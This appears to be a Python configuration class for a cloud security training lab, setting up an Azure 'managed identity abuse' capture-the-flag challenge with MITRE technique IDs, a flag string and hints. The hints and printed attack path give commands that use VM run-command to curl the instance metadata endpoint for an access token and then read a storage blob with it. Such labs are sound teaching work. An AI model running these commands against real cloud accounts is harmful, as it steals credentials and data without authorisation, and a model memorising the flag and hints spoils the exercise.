from cumulonimbus.providers.base.application_configuration import ApplicationConfigurationAbstract
import cumulonimbus.core.utils as utils
import os


class ApplicationConfiguration(ApplicationConfigurationAbstract):
    mitre_ttps = [
        {"id": "T1528", "name": "Steal Application Access Token", "url": "https://attack.mitre.org/techniques/T1528/"},
        {"id": "T1552.005", "name": "Cloud Instance Metadata API", "url": "https://attack.mitre.org/techniques/T1552/005/"},
        {"id": "T1078.004", "name": "Valid Accounts: Cloud Accounts", "url": "https://attack.mitre.org/techniques/T1078/004/"},
    ]
    def configure_application(self, **kwargs):
        key_pair_path = utils.get_key_pair_path('managed_identity_abuse')
        os.system("ssh-keygen -t rsa -b 4096 -f {} -N ''".format(key_pair_path))

    def get_difficulty(self):
        return "Intermediate"

    def get_hints(self):
        return {
            1: "You have Virtual Machine Contributor on the VM. This role includes the RunCommand action — look up 'az vm run-command invoke'.",
            2: "Use run-command to execute a shell script on the VM that queries the IMDS endpoint: curl -H 'Metadata: true' http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://storage.azure.com/",
            3: "Extract the access_token from the JSON response, then: curl -H 'Authorization: Bearer <token>' -H 'x-ms-version: 2019-12-12' https://<storage_account>.blob.core.windows.net/flags/flag.txt",
        }

    def get_flag(self):
        return "CUMULONIMBUS{M4n4g3d_1d3nt1ty_4bus3}"

    def pretty_print_tf_output(self, app_id, output):
        if not output:
            return
        print("###############################################")
        print("#             Required Information            #")
        print("###############################################")
        print("[1] Attacker username : " + output["attacker_username"]["value"])
        print("[2] Attacker password : " + output["attacker_password"]["value"])
        print("[3] VM name           : " + output["vm_name"]["value"])
        print("[4] Resource group    : " + output["resource_group_name"]["value"])
        print("[5] Storage account   : " + output["storage_account_name"]["value"])
        print("")
        print("Attack path:")
        print("  az login -u '{}' -p '<password>'".format(output["attacker_username"]["value"]))
        print("  az vm run-command invoke \\")
        print("    --resource-group '{}' \\".format(output["resource_group_name"]["value"]))
        print("    --name '{}' \\".format(output["vm_name"]["value"]))
        print("    --command-id RunShellScript \\")
        print("    --scripts \"curl -s -H 'Metadata: true' \\")
        print("      'http://169.254.169.254/metadata/identity/oauth2/token")
        print("       ?api-version=2018-02-01&resource=https://storage.azure.com/'\"")
        self.print_mitre_ttps()